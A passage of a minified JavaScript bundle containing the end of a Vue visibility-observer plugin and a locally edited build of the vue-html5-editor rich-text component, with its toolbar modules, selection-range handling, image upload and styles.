Symbol&&"symbol"==typeof Symbol.iterator?function(obj){return typeof obj}:function(obj){return obj&&"function"==typeof Symbol&&obj.constructor===Symbol&&obj!==Symbol.prototype?"symbol":typeof obj};g=function(){return this}();try{g=g||Function("return this")()||(0,eval)("this")}catch(e){"object"===("undefined"==typeof window?"undefined":_typeof(window))&&(g=window)}module.exports=g},function(module,exports,__webpack_require__){"use strict";(function(global){function install(Vue){Vue.directive("observe-visibility",__WEBPACK_IMPORTED_MODULE_0__directives_observe_visibility__.a)}var __WEBPACK_IMPORTED_MODULE_0__directives_observe_visibility__=__webpack_require__(0);Object.defineProperty(exports,"__esModule",{value:!0}),__webpack_require__.d(exports,"ObserveVisibility",function(){return __WEBPACK_IMPORTED_MODULE_0__directives_observe_visibility__.a}),exports.install=install;var plugin={version:"0.1.3",install:install};exports.default=plugin;var GlobalVue=null;"undefined"!=typeof window?GlobalVue=window.Vue:"undefined"!=typeof global&&(GlobalVue=global.Vue),GlobalVue&&GlobalVue.use(plugin)}).call(exports,__webpack_require__(1))}])});(function (global,factory){typeof exports ==='object' &&typeof module !=='undefined' ?module.exports =factory():typeof define ==='function' &&define.amd ?define(factory):(global.VueHtml5Editor =factory());}(this,(function (){function __$styleInject(css,returnValue){if (typeof document ==='undefined'){return returnValue;}css =css ||'';var head =document.head ||document.getElementsByTagName('head')[0];var style =document.createElement('style');style.type ='text/css';if (style.styleSheet){style.styleSheet.cssText =css;}else {style.appendChild(document.createTextNode(css));}head.appendChild(style);return returnValue;}var polyfill =function (){if (!Array.prototype.includes){Object.defineProperty(Array.prototype,'includes',{value:function value(searchElement,fromIndex){if (this ==null){throw new TypeError('"this" is null or not defined')}var o =Object(this);var len =o.length >>>0;if (len ===0){return false }var n =fromIndex |0;var k =Math.max(n >=0 ?n :len -Math.abs(n),0);while (k <len){if (o[k]===searchElement){return true }k++;}return false }});}if (!Text.prototype.contains){Text.prototype.contains =function contains(node){return this ===node };}};var template ="<div><button type=\"button\" @click=\"$parent.execCommand('justifyLeft')\">{{$parent.locale[\"left justify\"]}}</button><button type=\"button\" @click=\"$parent.execCommand('justifyCenter')\">{{$parent.locale[\"center justify\"]}}</button><button type=\"button\" @click=\"$parent.execCommand('justifyRight')\">{{$parent.locale[\"right justify\"]}}</button></div>";var dashboard ={template:template };var align ={name:'align',icon:'fa fa-align-center',i18n:'align',dashboard:dashboard };var template$1 ="<div><div><label><input type=\"radio\" value=\"foreColor\" v-model=\"command\">&nbsp;{{$parent.locale[\"fore color\"]}}</label><label><input type=\"radio\" value=\"backColor\" v-model=\"command\">&nbsp;{{$parent.locale[\"background color\"]}}</label></div><div><div v-for=\"color in colors\" :style=\"{'background-color':color}\" class=\"color-card\" @click=\"changeColor(color)\"></div><div style=\"clear:both\"></div></div></div>";__$styleInject(".vue-html5-editor .color-card{margin:2px;width:30px;height:30px;float:left;cursor:pointer}",undefined);var dashboard$1 ={template:template$1,data:function data(){return {command:'foreColor',colors:['#000000','#000033','#000066','#000099','#003300','#003333','#003366','#003399','#006600','#006633','#009900','#330000','#330033','#330066','#333300','#333366','#660000','#660033','#663300','#666600','#666633','#666666','#666699','#990000','#990033','#9900CC','#996600','#FFCC00','#FFCCCC','#FFCC99','#FFFF00','#FF9900','#CCFFCC','#CCFFFF','#CCFF99' ]}},methods:{changeColor:function changeColor(color){this.$parent.execCommand(this.command,color);}}};var color ={name:'color',icon:'fa fa-paint-brush',i18n:'color',dashboard:dashboard$1 };var eraser ={name:'eraser',icon:'fa fa-eraser',i18n:'eraser',handler:function handler(editor){editor.execCommand('removeFormat');}};var template$2 ="<div class=\"dashboard-font\" style=\"line-height:36px\"><div><label>{{$parent.locale[\"heading\"]}}:</label><button v-for=\"h in 6\" type=\"button\" @click=\"setHeading(h)\">H{{h}}</button></div><div><label>{{$parent.locale[\"font name\"]}}:</label><button v-for=\"name in nameList\" type=\"button\" @click=\"setFontName(name)\">{{name}}</button></div><div><label>{{$parent.locale[\"font size\"]}}:</label><button v-for=\"size in fontSizeList\" type=\"button\" @click=\"setFontSize(size)\">{{size}}</button></div><div><label>{{$parent.locale[\"line height\"]}}:</label><button v-for=\"lh in lineHeightList\" type=\"button\" @click=\"setLineHeight(lh)\">{{lh}}</button></div></div>";var Command ={JUSTIFY_LEFT:'justifyLeft',JUSTIFY_CENTER:'justifyCenter',JUSTIFY_RIGHT:'justifyRight',FORE_COLOR:'foreColor',BACK_COLOR:'backColor',REMOVE_FORMAT:'removeFormat',FONT_NAME:'fontName',FONT_SIZE:'fontSize',FORMAT_BLOCK:'formatBlock',LINE_HEIGHT:'lineHeight',INSERT_HORIZONTAL_RULE:'insertHorizontalRule',INSERT_IMAGE:'insertImage',CREATE_LINK:'createLink',INSERT_ORDERED_LIST:'insertOrderedList',INSERT_UNORDERED_LIST:'insertUnorderedList',INSERT_HTML:'insertHTML',BOLD:'bold',ITALIC:'italic',UNDERLINE:'underline',STRIKE_THROUGH:'strikeThrough',SUBSCRIPT:'subscript',SUPERSCRIPT:'superscript',UNDO:'undo',UNLINK:'unlink' };var dashboard$2 ={template:template$2,data:function data(){return {nameList:['Microsoft YaHei','Helvetica Neue','Helvetica','Arial','sans-serif','Verdana','Georgia','Times New Roman','Trebuchet MS','Microsoft JhengHei','Courier New','Impact','Comic Sans MS','Consolas' ],lineHeightList:['1.0','1.2','1.5','1.8','2.0','2.5','3.0' ],fontSizeList:['12px','14px','16px','18px','20px','22px','24px' ]}},methods:{setFontName:function setFontName(name){this.$parent.execCommand('fontName',name);},setFontSize:function setFontSize(size){this.$parent.execCommand('fontSize',size);},setHeading:function setHeading(heading){this.$parent.execCommand('formatBlock',("h" +heading));},setLineHeight:function setLineHeight(lh){this.$parent.execCommand(Command.LINE_HEIGHT,lh);}},created:function created(){var config =this.$options.module.config;if (!config){return }if (Array.isArray(config.fontNames)){this.nameList =config.fontNames;}}};var font ={name:'font',icon:'fa fa-font',i18n:'font',dashboard:dashboard$2 };var fullScreen$1 ={name:'full-screen',icon:'fa fa-arrows-alt',i18n:'full screen',handler:function handler(editor){editor.toggleFullScreen();}};var hr ={name:'hr',icon:'fa fa-minus',i18n:'hr',handler:function handler(editor){editor.execCommand('insertHorizontalRule');}};var commonjsGlobal =typeof window !=='undefined' ?window :typeof global !=='undefined' ?global :typeof self !=='undefined' ?self :{};function createCommonjsModule(fn,module){return module ={exports:{}},fn(module,module.exports),module.exports;}var template$3 ="<div><div v-show=\"upload.status=='ready'\"><input type=\"text\" v-model=\"imageUrl\" maxlength=\"255\" :placeholder=\"$parent.locale['please enter a url']\"><button type=\"button\" @click=\"insertImageUrl\">{{$parent.locale.save}}</button><input type=\"file\" ref=\"file\" style=\"display:none !important\" @change=\"process\" accept=\"image/png,image/jpeg,image/gif,image/jpg\"><button type=\"button\" @click=\"pick\">{{$parent.locale.upload}}</button></div><div v-if=\"upload.status=='progress'\">{{$parent.locale.progress}}:{{upload.progressComputable ?$parent.locale.unknown :upload.complete}}</div><div v-if=\"upload.status=='success'\">{{$parent.locale[\"please wait\"]}}...</div><div v-if=\"upload.status=='error'\">{{$parent.locale.error}}:{{upload.errorMsg}}<button type=\"button\" @click=\"reset\">{{$parent.locale.reset}}</button></div><div v-if=\"upload.status=='abort'\">{{$parent.locale.upload}}&nbsp;{{$parent.locale.abort}},<button type=\"button\" @click=\"reset\">{{$parent.locale.reset}}</button></div></div>";var dashboard$3 ={template:template$3,data:function data(){return {imageUrl:'',upload:{status:'ready',errorMsg:null,progressComputable:false,complete:0 }}},methods:{reset:function reset(){this.upload.status ='ready';},insertImageUrl:function insertImageUrl(){if (!this.imageUrl){return }this.$parent.execCommand(Command.INSERT_IMAGE,this.imageUrl);this.imageUrl =null;},pick:function pick(){this.$refs.file.click();},setUploadError:function setUploadError(msg){this.upload.status ='error';this.upload.errorMsg =msg;},process:function process(){var this$1 =this;var component =this;var config =this.$options.module.config;if (!config.upload &&typeof config.server ==='string'){config.upload ={url:config.server};}if (config.upload &&!config.upload.url){config.upload =null;}if (config.upload &&typeof config.fieldName ==='string'){config.upload.fieldName =config.fieldName;}if (typeof config.compress ==='boolean'){config.compress ={width:config.width,height:config.height,quality:config.quality };}var file =this.$refs.file.files[0];if (file.size >config.sizeLimit){this.setUploadError(this.$parent.locale['exceed size limit']);return }this.$refs.file.value =null;if (config.compress){config.compress.fieldName =config.upload &&config.upload.fieldName ?config.upload.fieldName :'image';alert("Contact admin edit by NBR!");return }if (!config.upload){var reader =new FileReader();reader.onload =function (e){component.insertBase64(e.target.result);};reader.readAsDataURL(file);return }component.uploadToServer(file);},insertBase64:function insertBase64(data){this.$parent.execCommand(Command.INSERT_IMAGE,data);},uploadToServer:function uploadToServer(file){var this$1 =this;var config =this.$options.module.config;var formData =new FormData();formData.append(config.upload.fieldName ||'image',file);if (typeof config.upload.params ==='object'){Object.keys(config.upload.params).forEach(function (key){var value =config.upload.params[key];if (Array.isArray(value)){value.forEach(function (v){formData.append(key,v);});}else {formData.append(key,value);}});}var xhr =new XMLHttpRequest();xhr.onprogress =function (e){this$1.upload.status ='progress';if (e.lengthComputable){this$1.upload.progressComputable =true;var percentComplete =e.loaded / e.total;this$1.upload.complete =(percentComplete *100).toFixed(2);}else {this$1.upload.progressComputable =false;}};xhr.onload =function (){if (xhr.status !==200){this$1.setUploadError(("request error,code " +(xhr.status)));return }try {var url =config.uploadHandler(xhr.responseText);if (url){this$1.$parent.execCommand(Command.INSERT_IMAGE,url);}}catch (err){this$1.setUploadError(err.toString());}finally {this$1.upload.status ='ready';}};xhr.onerror =function (){this$1.setUploadError('request error');};xhr.onabort =function (){this$1.upload.status ='abort';};xhr.open('POST',config.upload.url);if (typeof config.upload.headers ==='object'){Object.keys(config.upload.headers).forEach(function (k){xhr.setRequestHeader(k,config.upload.headers[k]);});}xhr.send(formData);}}};var image ={name:'image',icon:'fa fa-file-image-o',i18n:'image',config:{sizeLimit:512 *1024,compress:{width:1600,height:1600,quality:80 },uploadHandler:function uploadHandler(responseText){var json =JSON.parse(responseText);return json.ok ?json.data :null }},dashboard:dashboard$3 };var template$4 ="<div><h3 style=\"text-align:center\">Vue-html5-editor&nbsp;{{version}}</h3><p style=\"text-align:center\">repository:<a href=\"https://github.com/PeakTai/vue-html5-editor\" target=\"_blank\">https://github.com/PeakTai/vue-html5-editor </a></p></div>";var dashboard$4 ={template:template$4,data:function data(){return {version:"1.1.0" }}};var info ={name:'info',icon:'fa fa-info',i18n:'info',dashboard:dashboard$4 };var template$5 ="<form @submit.prevent=\"createLink\"><input type=\"text\" :placeholder=\"$parent.locale['please enter a url']\" v-model=\"url\" maxlength=\"1024\"><br><input type=\"text\" :placeholder=\"$parent.locale['please enter title of link']\" v-model=\"title\" maxlength=\"1024\"><br><input v-model=\"target\" value=\"false\" type=\"checkbox\">:have target.<br><button type=\"submit\">{{$parent.locale[\"create link\"]}}</button></form>";var dashboard$5 ={template:template$5,data:function data(){return {url:null,title:null,target:false}},computed:{dataLink:function(){return {url:this.url,title:this.title,target:this.target }}},methods:{createLink:function createLink(){if (!this.url){return }console.log(this.title+"|"+this.target);this.$parent.execCommand('createLink',this.dataLink);this.url =null;this.title =null;this.target =null;}}};var link ={name:'link',icon:'fa fa-chain',i18n:'link',dashboard:dashboard$5 };var template$6 ="<div><button type=\"button\" @click=\"$parent.execCommand('insertOrderedList')\">{{$parent.locale[\"ordered list\"]}}</button><button type=\"button\" @click=\"$parent.execCommand('insertUnorderedList')\">{{$parent.locale[\"unordered list\"]}}</button></div>";var dashboard$6 ={template:template$6 };var list ={name:'list',icon:'fa fa-list',i18n:'list',dashboard:dashboard$6 };var template$7 ="<form @submit.prevent=\"insertTable\"><label>{{$parent.locale[\"row count\"]}}<input type=\"number\" style=\"width:60px\" maxlength=\"2\" min=\"2\" max=\"10\" v-model=\"rows\"></label><label>{{$parent.locale[\"column count\"]}}<input type=\"number\" style=\"width:60px\" maxlength=\"2\" min=\"2\" max=\"10\" v-model=\"cols\"></label><button type=\"submit\">{{$parent.locale.save}}</button></form>";var dashboard$7 ={template:template$7,data:function data(){return {rows:2,cols:2,hasHead:false,striped:false,hover:false }},methods:{insertTable:function insertTable(){if (this.rows <2 ||this.rows >10){return }if (this.cols <2 ||this.cols >10){return }var table ='<table style="border-spacing:0px;border-collapse:collapse;width:100%;max-width:100%;margin-bottom:0px;border:1px solid rgb(221,221,221);color:rgb(51,51,51);font-size:14px;line-height:20px;background-color:transparent;"><tbody>';for (var i =0;i <this.rows;i++){table +='<tr>';for (var j =0;j <this.cols;j++){table +='<td style="padding:8px;line-height:1.42857;vertical-align:top;border:1px solid rgb(221,221,221);">&nbsp;</td>';}table +='</tr>';}table +='</tbody></table>';this.$parent.execCommand('insertHTML',table);}}};var table ={name:'tabulation',icon:'fa fa-table',i18n:'table',dashboard:dashboard$7 };var template$8 ="<div><button type=\"button\" @click=\"$parent.execCommand('bold')\">{{$parent.locale[\"bold\"]}}</button><button type=\"button\" @click=\"$parent.execCommand('italic')\">{{$parent.locale[\"italic\"]}}</button><button type=\"button\" @click=\"$parent.execCommand('underline')\">{{$parent.locale[\"underline\"]}}</button><button type=\"button\" @click=\"$parent.execCommand('strikeThrough')\">{{$parent.locale[\"strike through\"]}}</button><button type=\"button\" @click=\"$parent.execCommand('subscript')\">{{$parent.locale[\"subscript\"]}}</button><button type=\"button\" @click=\"$parent.execCommand('superscript')\">{{$parent.locale[\"superscript\"]}}</button></div>";var dashboard$8 ={template:template$8 };var text ={name:'text',icon:'fa fa-pencil',i18n:'text',dashboard:dashboard$8 };var undo ={name:'undo',icon:'fa-undo fa',i18n:'undo',handler:function handler(editor){editor.execCommand('undo');}};var unlink ={name:'unlink',icon:'fa fa-chain-broken',i18n:'unlink',handler:function handler(editor){editor.execCommand('unlink');}};var buildInModules =[text,color,font,align,list,link,unlink,table,image,hr,eraser,undo,fullScreen$1,info ];var mergeArray =function (sourceArr,extArr){extArr.forEach(function (el){sourceArr.push(el);});};var getDescendantTextNodes =function (ancestor){if (ancestor.nodeType ===Node.TEXT_NODE){return [ancestor]}var textNodes =[];if (!ancestor.hasChildNodes()){return textNodes }var childNodes =ancestor.childNodes;for (var i =0;i <childNodes.length;i++){var node =childNodes[i];if (node.nodeType ===Node.TEXT_NODE){textNodes.push(node);}else if (node.nodeType ===Node.ELEMENT_NODE){mergeArray(textNodes,getDescendantTextNodes(node));}}return textNodes };var getBeforeEndDescendantTextNodes =function (ancestor,endEl){var textNodes =[];var endIndex =0;for (var i =0;i <ancestor.childNodes.length;i++){if (ancestor.childNodes[i].contains(endEl)){endIndex =i;break }}for (var i$1 =0;i$1 <=endIndex;i$1++){var node =ancestor.childNodes[i$1];if (node ===endEl){mergeArray(textNodes,getDescendantTextNodes(node));}else if (i$1 ===endIndex){if (node.nodeType ===Node.TEXT_NODE){textNodes.push(node);}else if (node.nodeType ===Node.ELEMENT_NODE){mergeArray(textNodes,getBeforeEndDescendantTextNodes(node,endEl));}}else if (node.nodeType ===Node.TEXT_NODE){textNodes.push(node);}else if (node.nodeType ===Node.ELEMENT_NODE){mergeArray(textNodes,getDescendantTextNodes(node));}}return textNodes };var getAfterStartDescendantTextNodes =function (ancestor,startEl){var textNodes =[];var startIndex =0;for (var i =0;i <ancestor.childNodes.length;i++){if (ancestor.childNodes[i].contains(startEl)){startIndex =i;break }}for (var i$1 =startIndex;i$1 <ancestor.childNodes.length;i$1++){var node =ancestor.childNodes[i$1];if (node ===startEl){mergeArray(textNodes,getDescendantTextNodes(node));}else if (i$1 ===startIndex){if (node.nodeType ===Node.TEXT_NODE){textNodes.push(node);}else if (node.nodeType ===Node.ELEMENT_NODE){mergeArray(textNodes,getAfterStartDescendantTextNodes(node,startEl));}}else if (node.nodeType ===Node.TEXT_NODE){textNodes.push(node);}else if (node.nodeType ===Node.ELEMENT_NODE){mergeArray(textNodes,getDescendantTextNodes(node));}}return textNodes };var getParentLinkNBR=function(node){var blockNodeNames =['a','A'];var container =node;while (container){if (blockNodeNames.includes(container.nodeName)){break }container =container.parentNode;}return container };var getParentBlockNode =function (node){var blockNodeNames =['DIV','P','SECTION','H1','H2','H3','H4','H5','H6','OL','UL','LI','TR','TD','TH','TBODY','THEAD','TABLE','ARTICLE','HEADER','FOOTER'];var container =node;while (container){if (blockNodeNames.includes(container.nodeName)){break }container =container.parentNode;}return container };var isInlineElement =function (node){var inlineNodeNames =['A','ABBR','ACRONYM','B','CITE','CODE','EM','I','FONT','IMG','S','SMALL','SPAN','STRIKE','STRONG','U','SUB','SUP'];return inlineNodeNames.includes(node.nodeName)};if (!Text.prototype.contains){Text.prototype.contains =function contains(otherNode){return this ===otherNode };}var RangeHandler =function RangeHandler(range){if (!range ||!(range instanceof Range)){throw new TypeError('cant\'t resolve range')}this.range =range;};RangeHandler.prototype.getAllTextNodesInRange =function getAllTextNodesInRange (){var startContainer =this.range.startContainer;var endContainer =this.range.endContainer;var rootEl =this.range.commonAncestorContainer;var textNodes =[];if (startContainer ===endContainer){if (startContainer.nodeType ===Node.TEXT_NODE){return [startContainer]}var childNodes =startContainer.childNodes;for (var i =this.range.startOffset;i <this.range.endOffset;i++){mergeArray(textNodes,getDescendantTextNodes(childNodes[i]));}return textNodes }var startIndex =0;var endIndex =0;for (var i$1 =0;i$1 <rootEl.childNodes.length;i$1++){var node =rootEl.childNodes[i$1];if (node.contains(startContainer)){startIndex =i$1;}if (node.contains(endContainer)){endIndex =i$1;}}for (var i$2 =startIndex;i$2 <=endIndex;i$2++){var node$1 =rootEl.childNodes[i$2];if (i$2 ===startIndex){if (node$1.nodeType ===Node.TEXT_NODE){textNodes.push(node$1);}else if (node$1.nodeType ===Node.ELEMENT_NODE){mergeArray(textNodes,getAfterStartDescendantTextNodes(node$1,startContainer));}}else if (i$2 ===endIndex){if (node$1.nodeType ===Node.TEXT_NODE){textNodes.push(node$1);}else if (node$1.nodeType ===Node.ELEMENT_NODE){mergeArray(textNodes,getBeforeEndDescendantTextNodes(node$1,endContainer));}}else if (node$1.nodeType ===Node.TEXT_NODE){textNodes.push(node$1);}else if (node$1.nodeType ===Node.ELEMENT_NODE){mergeArray(textNodes,getDescendantTextNodes(node$1));}}return textNodes };RangeHandler.prototype.execCommand =function execCommand (command,arg){var this$1 =this;switch (command){case Command.JUSTIFY_LEFT:{document.execCommand(Command.JUSTIFY_LEFT,false,arg);break }case Command.JUSTIFY_RIGHT:{document.execCommand(Command.JUSTIFY_RIGHT,false,arg);break }case Command.JUSTIFY_CENTER:{document.execCommand(Command.JUSTIFY_CENTER,false,arg);break }case Command.FORE_COLOR:{document.execCommand(Command.FORE_COLOR,false,arg);break }case Command.BACK_COLOR:{document.execCommand(Command.BACK_COLOR,false,arg);break }case Command.REMOVE_FORMAT:{document.execCommand(Command.REMOVE_FORMAT,false,arg);break }case Command.FONT_NAME:{document.execCommand(Command.FONT_NAME,false,arg);break }case Command.FONT_SIZE:{var textNodes =this.getAllTextNodesInRange();if (!textNodes.length){break }if (textNodes.length ===1 &&textNodes[0]===this.range.startContainer &&textNodes[0]===this.range.endContainer){var textNode =textNodes[0];if (this.range.startOffset ===0 &&this.range.endOffset ===textNode.textContent.length){if (textNode.parentNode.childNodes.length ===1 &&isInlineElement(textNode.parentNode)){textNode.parentNode.style.fontSize =arg;break }var span =document.createElement('span');span.style.fontSize =arg;textNode.parentNode.insertBefore(span,textNode);span.appendChild(textNode);break }var span$1 =document.createElement('span');span$1.innerText =textNode.textContent.substring( this.range.startOffset,this.range.endOffset);span$1.style.fontSize =arg;var frontPart =document.createTextNode( textNode.textContent.substring(0,this.range.startOffset));textNode.parentNode.insertBefore(frontPart,textNode);textNode.parentNode.insertBefore(span$1,textNode);textNode.textContent =textNode.textContent.substring(this.range.endOffset);this.range.setStart(span$1,0);this.range.setEnd(span$1,1);break }textNodes.forEach(function (textNode){if (textNode ===this$1.range.startContainer){if (this$1.range.startOffset ===0){if (textNode.parentNode.childNodes.length ===1 &&isInlineElement(textNode.parentNode)){textNode.parentNode.style.fontSize =arg;}else {var span$1 =document.createElement('span');span$1.style.fontSize =arg;textNode.parentNode.insertBefore(span$1,textNode);span$1.appendChild(textNode);}return }var span$2 =document.createElement('span');textNode.textContent =textNode.textContent.substring( 0,this$1.range.startOffset);span$2.style.fontSize =arg;textNode.parentNode.insertBefore(span$2,textNode);this$1.range.setStart(textNode,0);return }if (textNode ===this$1.range.endContainer){if (this$1.range.endOffset ===textNode.textContent.length){if (textNode.parentNode.childNodes.length ===1 &&isInlineElement(textNode.parentNode)){textNode.parentNode.style.fontSize =arg;}else {var span$3 =document.createElement('span');span$3.style.fontSize =arg;textNode.parentNode.insertBefore(span$3,textNode);span$3.appendChild(textNode);}return }var span$4 =document.createElement('span');textNode.textContent =textNode.textContent.substring(this$1.range.endOffset);span$4.style.fontSize =arg;textNode.parentNode.insertBefore(span$4,textNode);span$4.appendChild(textNode);this$1.range.setStart(textNode,textNode.textContent.length);return }if (textNode.parentNode.childNodes.length ===1 &&isInlineElement(textNode.parentNode)){textNode.parentNode.style.fontSize =arg;return }var span =document.createElement('span');span.style.fontSize =arg;textNode.parentNode.insertBefore(span,textNode);span.appendChild(textNode);});break }case Command.FORMAT_BLOCK:{if (document.execCommand(Command.FORMAT_BLOCK,false,arg)){break }var element =document.createElement(arg);this.range.surroundContents(element);break }case Command.LINE_HEIGHT:{var textNodes$1 =this.getAllTextNodesInRange();textNodes$1.forEach(function (textNode){var parentBlock =getParentBlockNode(textNode);if (parentBlock){parentBlock.style.lineHeight =arg;}});break }case Command.INSERT_HORIZONTAL_RULE:{document.execCommand(Command.INSERT_HORIZONTAL_RULE,false);break }case Command.INSERT_IMAGE:{document.execCommand(Command.INSERT_IMAGE,false,arg);break }case Command.CREATE_LINK:{textNodes=(this.getAllTextNodesInRange());if(textNodes.length<0){alert("Select your text");}document.execCommand(Command.CREATE_LINK,false,arg.url);textNodes.forEach(function (textNode){var parentBlock =getParentLinkNBR(textNode);if (parentBlock){if(arg.target)parentBlock.target ="_blank";if(arg.title)parentBlock.title =arg.title;}console.log(textNode.textContent);});break }case Command.INSERT_ORDERED_LIST:{document.execCommand(Command.INSERT_ORDERED_LIST,false,arg);break }case Command.INSERT_UNORDERED_LIST:{document.execCommand(Command.INSERT_UNORDERED_LIST,false,arg);break }case Command.INSERT_HTML:{if (document.execCommand(Command.INSERT_HTML,false,arg)){break }var fragment =document.createDocumentFragment();var div =document.createElement('div');div.innerHTML =arg;if (div.hasChildNodes()){for (var i =0;i <div.childNodes.length;i++){fragment.appendChild(div.childNodes[i].cloneNode(true));}}this.range.deleteContents();this.range.insertNode(fragment);break }case Command.BOLD:{document.execCommand(Command.BOLD,false,arg);break }case Command.ITALIC:{document.execCommand(Command.ITALIC,false);break }case Command.UNDERLINE:{document.execCommand(Command.UNDERLINE,false);break }case Command.STRIKE_THROUGH:{document.execCommand(Command.STRIKE_THROUGH,false);break }case Command.SUBSCRIPT:{document.execCommand(Command.SUBSCRIPT,false);break }case Command.SUPERSCRIPT:{document.execCommand(Command.SUPERSCRIPT,false);break }case Command.UNDO:{document.execCommand(Command.UNDO,false);break }case Command.UNLINK:{document.execCommand(Command.UNLINK,false);break }default:{document.execCommand(command,false,arg);break }}};__$styleInject(".vue-html5-editor,.vue-html5-editor *{box-sizing:border-box}.vue-html5-editor{font-size:14px;line-height:1.5;background-color:#fff;color:#333;border:1px solid #ddd;text-align:left;border-radius:5px;overflow:hidden}.vue-html5-editor.full-screen{position:fixed!important;top:0!important;left:0!important;bottom:0!important;right:0!important;border-radius:0}.vue-html5-editor>.toolbar{position:relative;background-color:inherit}.vue-html5-editor>.toolbar>ul{list-style:none;padding:0;margin:0;border-bottom:1px solid #ddd}.vue-html5-editor>.toolbar>ul>li{display:inline-block;cursor:pointer;text-align:center;line-height:36px;padding:0 10px}.vue-html5-editor>.toolbar>ul>li .icon{height:16px;width:16px;display:inline-block;vertical-align:middle}.vue-html5-editor>.toolbar>.dashboard{background-color:inherit;border-bottom:1px solid #ddd;padding:10px;position:absolute;top:100%;left:0;right:0;overflow:auto}.vue-html5-editor>.toolbar>.dashboard input[type=text],.vue-html5-editor>.toolbar>.dashboard input[type=number],.vue-html5-editor>.toolbar>.dashboard select{padding:6px 12px;color:inherit;background-color:transparent;border:1px solid #ddd;border-radius:5px}.vue-html5-editor>.toolbar>.dashboard input[type=text]:hover,.vue-html5-editor>.toolbar>.dashboard input[type=number]:hover,.vue-html5-editor>.toolbar>.dashboard select:hover{border-color:#bebebe}.vue-html5-editor>.toolbar>.dashboard input[type=text][disabled],.vue-html5-editor>.toolbar>.dashboard input[type=text][readonly],.vue-html5-editor>.toolbar>.dashboard input[type=number][disabled],.vue-html5-editor>.toolbar>.dashboard input[type=number][readonly],.vue-html5-editor>.toolbar>.dashboard select[disabled],.vue-html5-editor>.toolbar>.dashboard select[readonly]{background-color:#eee;opacity:1}.vue-html5-editor>.toolbar>.dashboard input[type=text][disabled],.vue-html5-editor>.toolbar>.dashboard input[type=number][disabled],.vue-html5-editor>.toolbar>.dashboard select[disabled]{cursor:not-allowed}.vue-html5-editor>.toolbar>.dashboard button{color:inherit;background-color:inherit;padding:6px 12px;white-space:nowrap;vertical-align:middle;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;border:1px solid #ddd;border-radius:5px;margin-right:4px;margin-bottom:4px}.vue-html5-editor>.toolbar>.dashboard button:hover{border-color:#bebebe}.vue-html5-editor>.toolbar>.dashboard button[disabled]{cursor:not-allowed;opacity:.68}.vue-html5-editor>.toolbar>.dashboard button:last-child{margin-right:0}.vue-html5-editor>.toolbar>.dashboard label{font-weight:bolder}.vue-html5-editor>.content{overflow:auto;padding:10px}.vue-html5-editor>.content:focus{outline:0}",undefined);var template$9 ="<div class=\"vue-html5-editor\" :class=\"{'full-screen':fullScreen}\" :style=\"{'z-index':zIndex}\"><div class=\"toolbar\" :style=\"{'z-index':zIndex+1}\" ref=\"toolbar\"><ul><template v-for=\"module in modules\"><li :title=\"locale[module.i18n]\" @click=\"activeModule(module)\"><span class=\"icon\" :class=\"module.icon\"></span><template v-if=\"showModuleName ===undefined ?defaultShowModuleName :showModuleName\">&nbsp;{{locale[module.i18n]}}</template></li></template></ul><div class=\"dashboard\" v-show=\"dashboard\" ref=\"dashboard\"><keep-alive><div v-show=\"dashboard\" :is=\"dashboard\"></div></keep-alive></div></div><div class=\"content\" ref=\"content\" :style=\"contentStyle\" contenteditable @click=\"toggleDashboard(dashboard)\"></div></div>";var editor ={template:template$9,props:{content:{type:String,required:true,default:'' },height:{type:Number,default:300,validator:function validator(val){return val >=100 }},zIndex:{type:Number,default:1000 },autoHeight:{type:Boolean,default:true },showModuleName:{}},data:function data(){return {fullScreen:false,dashboard:null }},watch:{content:function content(val){var content =this.$refs.content.innerHTML;if (val !==content){this.$refs.content.innerHTML =val;}},fullScreen:function fullScreen(val){var component =this;if (val){component.parentEl =component.$el.parentNode;component.nextEl =component.$el.nextSibling;document.body.appendChild(component.$el);return }if (component.nextEl){component.parentEl.insertBefore(component.$el,component.nextEl);return }component.parentEl.appendChild(component.$el);}},computed:{contentStyle:function contentStyle(){var style ={};if (this.fullScreen){style.height =(window.innerHeight -this.$refs.toolbar.clientHeight -1)+"px";return style }if (!this.autoHeight){style.height =(this.height)+"px";return style }style['min-height']=(this.height)+"px";return style }},methods:{toggleFullScreen:function toggleFullScreen(){this.fullScreen =!this.fullScreen;},enableFullScreen:function enableFullScreen(){this.fullScreen =true;},exitFullScreen:function exitFullScreen(){this.fullScreen =false;},focus:function focus(){this.$refs.content.focus();},toggleDashboard:function toggleDashboard(dashboard){this.dashboard =this.dashboard ===dashboard ?null :dashboard;},execCommand:function execCommand(command,arg){this.restoreSelection();if (this.range){new RangeHandler(this.range).execCommand(command,arg);}this.toggleDashboard();this.$emit('change',this.$refs.content.innerHTML);},getCurrentRange:function getCurrentRange(){return this.range },saveCurrentRange:function saveCurrentRange(){var this$1 =this;var selection =window.getSelection ?window.getSelection():document.getSelection();if (!selection.rangeCount){return }var content =this.$refs.content;for (var i =0;i <selection.rangeCount;i++){var range =selection.getRangeAt(0);var start =range.startContainer;var end =range.endContainer;start =start.nodeType ===Node.TEXT_NODE ?start.parentNode :start;end =end.nodeType ===Node.TEXT_NODE ?end.parentNode :end;if (content.contains(start)&&content.contains(end)){this$1.range =range;break }}},restoreSelection:function restoreSelection(){var selection =window.getSelection ?window.getSelection():document.getSelection();selection.removeAllRanges();if (this.range){selection.addRange(this.range);}else {var content =this.$refs.content;var div =document.createElement('div');var range =document.createRange();content.appendChild(div);range.setStart(div,0);range.setEnd(div,0);selection.addRange(range);this.range =range;}},activeModule:function activeModule(module){if (typeof module.handler ==='function'){module.handler(this);return }if (module.hasDashboard){this.toggleDashboard(("dashboard-" +(module.name)));}}},created:function created(){var this$1 =this;this.modules.forEach(function (module){if (typeof module.init ==='function'){module.init(this$1);}});},mounted:function mounted(){var this$1 =this;var content =this.$refs.content;content.innerHTML =this.content;content.addEventListener('mouseup',this.saveCurrentRange,false);content.addEventListener('keyup',function (){this$1.$emit('change',content.innerHTML);this$1.saveCurrentRange();},false);content.addEventListener('mouseout',function (e){if (e.target ===content){this$1.saveCurrentRange();}},false);this.touchHandler =function (e){if (content.contains(e.target)){this$1.saveCurrentRange();}};window.addEventListener('touchend',this.touchHandler,false);},updated:function updated(){if (this.$refs.dashboard){this.$refs.dashboard.style.maxHeight =(this.$refs.content.clientHeight)+"px";}},beforeDestroy:function beforeDestroy(){var this$1 =this;window.removeEventListener('touchend',this.touchHandler);this.modules.forEach(function (module){if (typeof module.destroyed ==='function'){module.destroyed(this$1);}});}};var i18nEnUs 